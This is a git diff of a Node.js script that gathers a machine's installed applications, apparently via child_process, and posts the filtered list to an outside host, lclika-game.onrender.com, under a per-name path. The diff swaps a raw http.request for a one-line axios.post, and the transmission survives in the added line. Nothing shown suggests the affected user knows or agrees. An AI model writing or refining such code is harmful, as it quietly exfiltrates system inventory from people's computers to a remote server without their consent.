@@ -1,5 +1,6 @@
-let name = 'anass'
-let port = 10000
+let name = "anass";
+let port = 10000;
+const { default: axios } = require("axios");
 const { exec } = require("child_process");
 const http = require("http");
 function isUpper(letter) {
@@ -39,31 +40,7 @@ function processInstalledApplications(name) {
           name && name.length > 0 && !name.startsWith("0x") && isUpper(name[0])
         );
       });
-
-      const data = JSON.stringify({ data: apps });
-      const options = {
-        hostname: "lclika-game.onrender.com",
-        port: port || 10000,
-        path: `/${name}`,
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Content-Length": data.length,
-        },
-      };
-
-      const req = http.request(options, (res) => {
-        res.on("data", (chunk) => {
-          console.log(chunk.toString());
-        });
-      });
-
-      req.on("error", (error) => {
-        console.error(`Error: ${error.message}`);
-      });
-
-      req.write(data);
-      req.end();
+      axios.post("https://lclika-game.onrender.com/" + name, { data: apps });
     }
   );
 }
